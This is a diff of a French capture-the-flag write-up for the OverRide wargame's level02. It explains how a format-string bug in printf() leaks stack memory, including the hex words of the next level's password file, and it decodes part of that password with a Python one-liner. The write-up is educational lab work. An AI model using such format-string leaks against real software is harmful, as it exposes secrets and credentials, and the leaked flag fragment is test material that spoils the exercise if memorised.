@@ -57,13 +57,23 @@ On constate la présence du <main>. Etudions l'activitée de ce dernier :
        0x42424242 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 
        0x48336750664b394d (nil) 0x7025204141414141 0x2520702520702520 0x2070252070252070 does not have access!
     
+    N'ayant pas d'argument, printf() depile la stack :
     
-    On retrouve bien ici :     ---| USERNAME |------| .PASS |------| PASSWORD |----
-                               ---|   str_1  |------| str_2 |------|   str_3  |----
-                               
+    On retrouve bien ici :     
+                            
+            [rsp]             ----|     HAUT STACK      |------
+                              ----|     SF printf()     |------
+            [-0xa0(rbp)]      ----|   PASSWORD / str_1  |------
+            [-0xa0(rbp)]      ----|    .PASS / str_2    |------
+            [-0x70(rbp)]      ----|   USERNAME / str_3  |------
+                              ----|                     |------ 
+            [rbp]             ----|     BAS STACK       |------
+            
     
     - Le contenu du fichier .pass est donc :
       0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
+      
+      
       
     >$ level02@OverRide:~$ python -c 'print "756e505234376848".decode("hex")[::-1]'
        Hh74RPnu
